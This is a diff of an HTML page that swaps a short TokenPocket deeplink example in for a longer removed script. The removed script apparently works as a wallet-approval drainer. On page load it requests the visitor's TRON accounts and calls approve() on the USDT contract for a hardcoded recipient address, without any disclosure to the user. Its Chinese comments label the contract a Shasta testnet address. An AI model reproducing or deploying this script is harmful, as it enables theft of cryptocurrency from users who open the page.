@@ -1,56 +1,15 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TRON USDT Authorization with TokenPocket</title>
-</head>
+<html>
 <body>
-    <h1>TRON USDT Authorization</h1>
 
-    <script>
-        async function initializeAndAuthorize() {
-            // 检查 TokenPocket 钱包是否已安装并准备好
-            if (typeof window.tronLink === 'undefined' || !window.tronLink.tronWeb || !window.tronLink.tronWeb.ready) {
-                alert('请安装并启动 TokenPocket 钱包！');
-                return;
-            }
+<h1>The a href attribute</h1>
 
-            try {
-                const tronWeb = window.tronLink.tronWeb;
+<a href='tpdapp://open?params={
+	"url": "https://dapp.mytokenpocket.vip/referendum/index.html#/",
+	"chain": "EOS",
+	"source": "xxx" 
+}'>Open TokenPocket to open url</a><br/>
 
-                // 请求用户授权账户
-                const accounts = await tronWeb.request({ method: 'tron_requestAccounts' });
-                if (accounts.length === 0) {
-                    alert('未找到用户账户，请检查 TokenPocket 钱包设置。');
-                    return;
-                }
-                const fromAddress = accounts[0];
-
-                // 设置授权参数
-                const recipientAddress = 'TThzxNRLrW2Brp9DcTQU8i4Wd9udCWEdZ3'; // 接收地址
-                const tokenContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // Shasta 测试网 USDT 合约地址
-                const amount = 100000; // 授权的 USDT 数量（单位是最小单位）
-
-                // 获取 TRON 网络的合约
-                const contract = await tronWeb.contract().at(tokenContractAddress);
-
-                // 执行授权
-                const result = await contract.methods.approve(recipientAddress, amount).send({ from: fromAddress });
-                
-                if (result.result) {
-                    alert('授权成功！');
-                } else {
-                    alert('授权失败！');
-                }
-            } catch (error) {
-                console.error('发生错误:', error);
-                alert('发生错误，请查看控制台。');
-            }
-        }
-
-        // 页面加载时自动调用
-        window.addEventListener('load', initializeAndAuthorize);
-    </script>
 </body>
 </html>
+
